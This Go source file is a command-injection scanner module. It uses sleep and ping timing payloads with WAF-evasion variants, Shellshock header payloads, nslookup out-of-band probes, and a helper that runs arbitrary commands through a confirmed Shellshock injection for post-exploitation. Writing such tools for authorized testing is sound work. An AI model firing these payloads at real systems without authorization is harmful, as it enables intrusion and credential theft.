// Package cmdinj implements an OS command injection scanner with two detection
// modes and a post-exploitation pipeline:
//
// 1. Timing-based detection: calibrated sleep injection in query parameters
//    (baseline → sleep 3 → verify delta > 2.5s → sleep 5 → proportional confirm)
//
// 2. Shellshock detection (CVE-2014-6271): crafted function definitions in HTTP
//    headers sent to CGI endpoints — marker string in response confirms execution
//
// Post-exploitation (ScanAuthorized only): after confirming command injection,
// runs reconnaissance (env, /etc/hosts, ARP, ifconfig), discovers internal hosts,
// probes for services (Redis, Elasticsearch, databases), and extracts data/creds
// through the injection point.
//
// Detection runs at ScanDeep; post-exploitation requires ScanAuthorized.
package cmdinj

import (
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"sort"
	"strings"
	"time"

	"github.com/stormbane-security/beacon/internal/evasion"
	"github.com/stormbane-security/beacon/internal/finding"
	"github.com/stormbane-security/beacon/internal/module"
	"github.com/stormbane-security/beacon/internal/oob"
	"github.com/stormbane-security/beacon/internal/scan"
	"github.com/stormbane-security/beacon/internal/scanner/authctx"
)

func init() {
	scan.RegisterWithCheckDecls(scannerName, func(_ scan.ScannerConfig) scan.Scanner {
		return New()
	},
		scan.Check(finding.CheckWebCmdInjection, finding.SeverityCritical, finding.ModeDeep),
	)
}

const (
	scannerName     = "cmdinj"
	shellshockMark  = "BEACON_CMDINJ_8f3a2c"
)

type payload struct {
	name    string // human label
	os      string // unix, windows, any
	prefix  string // injected before the sleep command
	sleepFn string // sleep command template (%d = seconds)
	suffix  string // injected after
}

var payloads = []payload{
	// Unix — various injection contexts
	{name: "unix-semi", os: "unix", prefix: "; sleep ", sleepFn: "%d", suffix: " #"},
	{name: "unix-pipe", os: "unix", prefix: "| sleep ", sleepFn: "%d", suffix: ""},
	{name: "unix-backtick", os: "unix", prefix: "`sleep ", sleepFn: "%d", suffix: "`"},
	{name: "unix-subshell", os: "unix", prefix: "$(sleep ", sleepFn: "%d", suffix: ")"},
	{name: "unix-newline", os: "unix", prefix: "\nsleep ", sleepFn: "%d", suffix: "\n"},
	{name: "unix-and", os: "unix", prefix: "&& sleep ", sleepFn: "%d", suffix: ""},
	{name: "unix-or", os: "unix", prefix: "|| sleep ", sleepFn: "%d", suffix: ""},

	// Windows
	{name: "win-and-ping", os: "windows", prefix: "& ping -n ", sleepFn: "%d", suffix: " 127.0.0.1 >nul"},
	{name: "win-pipe-ping", os: "windows", prefix: "| ping -n ", sleepFn: "%d", suffix: " 127.0.0.1 >nul"},
	{name: "win-timeout", os: "windows", prefix: "& timeout /t ", sleepFn: "%d", suffix: " >nul"},
}

// probePaths are paths and parameters commonly vulnerable to command injection.
var probePaths = []struct {
	path   string
	params []string
}{
	{"/", []string{"cmd", "exec", "command", "run", "ping", "host", "ip"}},
	{"/api/v1/ping", []string{"host", "target", "ip"}},
	{"/admin/backup", []string{"file", "path", "dir"}},
	{"/tools/lookup", []string{"domain", "host", "ip", "target"}},
	{"/api/health", []string{"check", "host"}},
}

// shellshockPaths are CGI paths commonly vulnerable to Shellshock.
var shellshockPaths = []string{
	"/cgi-bin/vulnerable",
	"/cgi-bin/test",
	"/cgi-bin/status",
	"/cgi-bin/bash",
	"/cgi-bin/env",
	"/cgi-bin/",
}

// shellshockHeaders are HTTP headers to test for Shellshock injection.
var shellshockHeaders = []string{
	"User-Agent",
	"Referer",
	"Cookie",
}

// Scanner checks for OS command injection via timing analysis and Shellshock.
type Scanner struct{}

func New() *Scanner { return &Scanner{} }

func (s *Scanner) Name() string { return scannerName }

func (s *Scanner) Run(ctx context.Context, asset string, scanType module.ScanType) ([]finding.Finding, error) {
	if scanType != module.ScanDeep && scanType != module.ScanAuthorized {
		return nil, nil
	}

	ac := authctx.HTTPClient(ctx)
	client := &http.Client{
		Timeout: 30 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, //nolint:gosec
		},
		Jar: ac.Jar,
	}

	scheme := detectScheme(ctx, client, asset)
	if scheme == "" {
		return nil, nil
	}

	var findings []finding.Finding

	// Phase 1: Shellshock detection (CVE-2014-6271)
	shellFindings := s.shellshockProbe(ctx, client, scheme, asset, scanType)
	findings = append(findings, shellFindings...)

	// Phase 2: Timing-based parameter injection
	paramFindings := s.timingProbe(ctx, client, scheme, asset, scanType)
	findings = append(findings, paramFindings...)

	return findings, nil
}

// shellshockProbe detects Shellshock (CVE-2014-6271) by injecting function
// definitions into HTTP headers sent to CGI endpoints.
func (s *Scanner) shellshockProbe(ctx context.Context, client *http.Client, scheme, asset string, scanType module.ScanType) []finding.Finding {
	var findings []finding.Finding

	for _, path := range shellshockPaths {
		for _, header := range shellshockHeaders {
			if ctx.Err() != nil {
				return findings
			}

			targetURL := fmt.Sprintf("%s://%s%s", scheme, asset, path)
			req, err := http.NewRequestWithContext(ctx, http.MethodGet, targetURL, nil)
			if err != nil {
				continue
			}

			// Shellshock payload: bash function definition followed by command.
			// The () { :;}; pattern exploits CVE-2014-6271 where bash processes
			// trailing commands in function definitions stored in env vars.
			shellPayload := fmt.Sprintf("() { :;}; echo; echo %s", shellshockMark)
			req.Header.Set(header, shellPayload)

			resp, err := client.Do(req)
			if err != nil {
				continue
			}
			body, _ := io.ReadAll(io.LimitReader(resp.Body, 8192))
			resp.Body.Close()

			if !strings.Contains(string(body), shellshockMark) {
				continue
			}

			findings = append(findings, finding.Finding{
				CheckID:  finding.CheckWebCmdInjection,
				Module:   "deep",
				Scanner:  scannerName,
				Severity: finding.SeverityCritical,
				Title:    fmt.Sprintf("Shellshock (CVE-2014-6271): command injection via %s on %s", header, path),
				Description: fmt.Sprintf(
					"The CGI endpoint at %s is vulnerable to Shellshock (CVE-2014-6271). "+
						"Commands injected via the %s header are executed by the server and "+
						"output is returned in the response body. This allows arbitrary "+
						"command execution on the server.",
					path, header),
				Asset:    asset,
				DeepOnly: true,
				Evidence: map[string]any{
					"path":          path,
					"header":        header,
					"cve":           "CVE-2014-6271",
					"marker_echoed": true,
				},
				ProofCommand: fmt.Sprintf(
					`curl -s -H '%s: () { :;}; echo; /bin/id' '%s'`,
					header, targetURL),
				DiscoveredAt: time.Now(),
			})

			// Post-exploitation: only in authorized mode.
			if scanType == module.ScanAuthorized {
				execCmd := func(cmd string) (string, error) {
					return shellshockExec(ctx, client, targetURL, header, cmd)
				}
				postFindings := postExploit(ctx, execCmd, asset, path, header)
				findings = append(findings, postFindings...)
			}

			// One confirmed Shellshock finding is enough — stop all probes.
			return findings
		}
	}

	return findings
}

// shellshockExec executes a command through a confirmed Shellshock injection
// point and returns the command output.
func shellshockExec(ctx context.Context, client *http.Client, targetURL, header, cmd string) (string, error) {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, targetURL, nil)
	if err != nil {
		return "", err
	}

	// Wrap command in /bin/bash -c for reliable execution.
	shellPayload := fmt.Sprintf("() { :;}; echo; /bin/bash -c '%s'", cmd)
	req.Header.Set(header, shellPayload)

	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(io.LimitReader(resp.Body, 64*1024))
	if err != nil {
		return "", err
	}

	return strings.TrimSpace(string(body)), nil
}

// timingProbe detects command injection via calibrated sleep timing on query
// parameters. Same logic as before, factored into its own method.
func (s *Scanner) timingProbe(ctx context.Context, client *http.Client, scheme, asset string, scanType module.ScanType) []finding.Finding {
	var findings []finding.Finding

	for _, pp := range probePaths {
		if ctx.Err() != nil {
			break
		}

		for _, param := range pp.params {
			if ctx.Err() != nil {
				break
			}

			baseURL := fmt.Sprintf("%s://%s%s?%s=test", scheme, asset, pp.path, param)
			baseline, err := measureBaseline(ctx, client, baseURL, 5)
			if err != nil {
				continue
			}

			for _, p := range payloads {
				if ctx.Err() != nil {
					break
				}

				injected3 := buildPayload(p, 3)

				// Build candidate list: original payload + WAF evasion variants.
				candidates := []string{injected3}
				if p.os == "unix" {
					candidates = append(candidates, evasion.CmdBypass(injected3)...)
				}

				var confirmedURL3 string
				var confirmedDelta3 time.Duration
				var confirmedLabel string
				var confirmedIdx int

				for ci, candidate := range candidates {
					if ctx.Err() != nil {
						break
					}
					testURL := fmt.Sprintf("%s://%s%s?%s=%s", scheme, asset, pp.path, param, url.QueryEscape("test"+candidate))
					latency, err := timeRequest(ctx, client, testURL)
					if err != nil {
						continue
					}
					delta := latency - baseline
					if delta >= 2500*time.Millisecond {
						confirmedURL3 = testURL
						confirmedDelta3 = delta
						confirmedIdx = ci
						if ci == 0 {
							confirmedLabel = p.name
						} else {
							confirmedLabel = fmt.Sprintf("%s+evasion-%d", p.name, ci)
						}
						break
					}
				}

				if confirmedURL3 == "" {
					continue
				}

				// Confirm with sleep(5). Use the same evasion variant that
				// worked for sleep(3), otherwise a WAF blocks the confirmation.
				injected5 := buildPayload(p, 5)
				candidates5 := []string{injected5}
				if p.os == "unix" {
					candidates5 = append(candidates5, evasion.CmdBypass(injected5)...)
				}
				confirm5 := injected5
				if confirmedIdx < len(candidates5) {
					confirm5 = candidates5[confirmedIdx]
				}
				testURL5 := fmt.Sprintf("%s://%s%s?%s=%s", scheme, asset, pp.path, param, url.QueryEscape("test"+confirm5))
				latency5, err := timeRequest(ctx, client, testURL5)
				if err != nil {
					continue
				}

				delta5 := latency5 - baseline
				if delta5 < 4500*time.Millisecond {
					continue
				}

				findings = append(findings, finding.Finding{
					CheckID:  finding.CheckWebCmdInjection,
					Module:   "deep",
					Scanner:  scannerName,
					Severity: finding.SeverityCritical,
					Title:    fmt.Sprintf("OS command injection in %s parameter at %s", param, pp.path),
					Description: fmt.Sprintf(
						"Calibration-based timing confirmed command injection. "+
							"Baseline: %s, sleep(3) delta: %s, sleep(5) delta: %s. "+
							"OS type: %s. Payload: %s",
						baseline.Round(time.Millisecond), confirmedDelta3.Round(time.Millisecond),
						delta5.Round(time.Millisecond), p.os, confirmedLabel),
					Asset:    asset,
					DeepOnly: true,
					Evidence: map[string]any{
						"path":            pp.path,
						"parameter":       param,
						"payload":         confirmedLabel,
						"os_type":         p.os,
						"baseline_ms":     baseline.Milliseconds(),
						"sleep3_delta_ms": confirmedDelta3.Milliseconds(),
						"sleep5_delta_ms": delta5.Milliseconds(),
						"waf_bypass":      confirmedLabel != p.name,
					},
					ProofCommand: fmt.Sprintf(
						`time curl -sk '%s'  # should take ~3s longer than baseline`,
						confirmedURL3),
					DiscoveredAt: time.Now(),
				})
				break // one per parameter
			}

			// OOB confirmation
			if oobSrv := oob.FromContext(ctx); oobSrv != nil {
				token := oobSrv.GenerateToken(fmt.Sprintf("cmdinj-%s-%s", pp.path, param))
				oobDomain := oobSrv.DNSHostname(token)

				oobPayloads := []string{
					fmt.Sprintf("; nslookup %s #", oobDomain),
					fmt.Sprintf("| nslookup %s", oobDomain),
					fmt.Sprintf("$(nslookup %s)", oobDomain),
					fmt.Sprintf("& nslookup %s", oobDomain),
				}

				for _, op := range oobPayloads {
					testURL := fmt.Sprintf("%s://%s%s?%s=%s", scheme, asset, pp.path, param, url.QueryEscape("test"+op))
					_, _ = timeRequest(ctx, client, testURL)
				}

				if cb, ok := oobSrv.WaitForCallback(ctx, token, 5*time.Second); ok {
					findings = append(findings, finding.Finding{
						CheckID:  finding.CheckWebCmdInjection,
						Module:   "deep",
						Scanner:  scannerName,
						Severity: finding.SeverityCritical,
						Title:    fmt.Sprintf("OOB command injection confirmed in %s at %s", param, pp.path),
						Description: fmt.Sprintf(
							"Out-of-band DNS callback received from %s after nslookup injection, "+
								"confirming OS command injection.", cb.RemoteAddr),
						Asset:    asset,
						DeepOnly: true,
						Evidence: map[string]any{
							"path":        pp.path,
							"parameter":   param,
							"oob_token":   token,
							"callback_ip": cb.RemoteAddr,
							"protocol":    cb.Protocol,
						},
						DiscoveredAt: time.Now(),
					})
				}
			}
		}
	}

	return findings
}

func buildPayload(p payload, seconds int) string {
	sleep := fmt.Sprintf(p.sleepFn, seconds)
	return p.prefix + sleep + p.suffix
}

func measureBaseline(ctx context.Context, client *http.Client, rawURL string, n int) (time.Duration, error) {
	var latencies []time.Duration
	for i := 0; i < n; i++ {
		d, err := timeRequest(ctx, client, rawURL)
		if err != nil {
			return 0, err
		}
		latencies = append(latencies, d)
	}
	sort.Slice(latencies, func(i, j int) bool { return latencies[i] < latencies[j] })
	return latencies[len(latencies)/2], nil
}

func timeRequest(ctx context.Context, client *http.Client, rawURL string) (time.Duration, error) {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, rawURL, nil)
	if err != nil {
		return 0, err
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; beacon-cmdinj-scanner)")

	start := time.Now()
	resp, err := client.Do(req)
	elapsed := time.Since(start)
	if err != nil {
		return elapsed, err
	}
	_, _ = io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	return elapsed, nil
}

func detectScheme(ctx context.Context, client *http.Client, asset string) string {
	for _, scheme := range []string{"https", "http"} {
		req, err := http.NewRequestWithContext(ctx, http.MethodHead, scheme+"://"+asset+"/", nil)
		if err != nil {
			continue
		}
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		resp.Body.Close()
		return scheme
	}
	return ""
}
